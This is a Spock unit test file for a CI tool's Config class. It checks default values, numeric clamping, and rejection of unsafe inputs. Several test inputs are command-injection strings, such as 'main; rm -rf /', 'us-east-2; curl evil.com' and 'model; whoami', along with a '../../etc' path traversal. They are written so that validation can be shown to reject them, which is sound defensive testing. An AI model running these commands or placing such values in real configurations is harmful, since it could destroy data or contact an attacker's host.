package com.cifast

import spock.lang.Specification

class ConfigTest extends Specification {

    def "default config values"() {
        when:
        def config = new Config([:])

        then:
        config.baseBranch == 'main'
        config.region == 'us-east-2'
        config.model == 'us.anthropic.claude-sonnet-4-6-v1'
        config.confidenceThreshold == 0.7
        config.maxDiffLines == 3000
        config.smallDiffThreshold == 200
        config.smallTestThreshold == 30
        !config.dryRun
    }

    def "accepts valid baseBranch values"() {
        when:
        def config = new Config([baseBranch: branch])

        then:
        config.baseBranch == branch

        where:
        branch << ['main', 'develop', 'feature/my-branch', 'release/1.0.0', 'hotfix_123']
    }

    def "rejects command injection in baseBranch"() {
        when:
        new Config([baseBranch: 'main; rm -rf /'])

        then:
        thrown(IllegalArgumentException)
    }

    def "rejects path traversal in baseBranch"() {
        when:
        new Config([baseBranch: '../../etc'])

        then:
        thrown(IllegalArgumentException)
    }

    def "rejects invalid region"() {
        when:
        new Config([region: 'us-east-2; curl evil.com'])

        then:
        thrown(IllegalArgumentException)
    }

    def "rejects invalid model"() {
        when:
        new Config([model: 'model; whoami'])

        then:
        thrown(IllegalArgumentException)
    }

    def "rejects invalid test glob"() {
        when:
        new Config([testGlobs: ["'; rm -rf /"]])

        then:
        thrown(IllegalArgumentException)
    }

    def "clamps confidenceThreshold to 0-1 range"() {
        expect:
        new Config([confidenceThreshold: 1.5]).confidenceThreshold == 1.0
        new Config([confidenceThreshold: -0.5]).confidenceThreshold == 0.0
    }

    def "clamps maxDiffLines to minimum of 1"() {
        expect:
        new Config([maxDiffLines: -100]).maxDiffLines == 1
        new Config([maxDiffLines: 0]).maxDiffLines == 1
    }
}
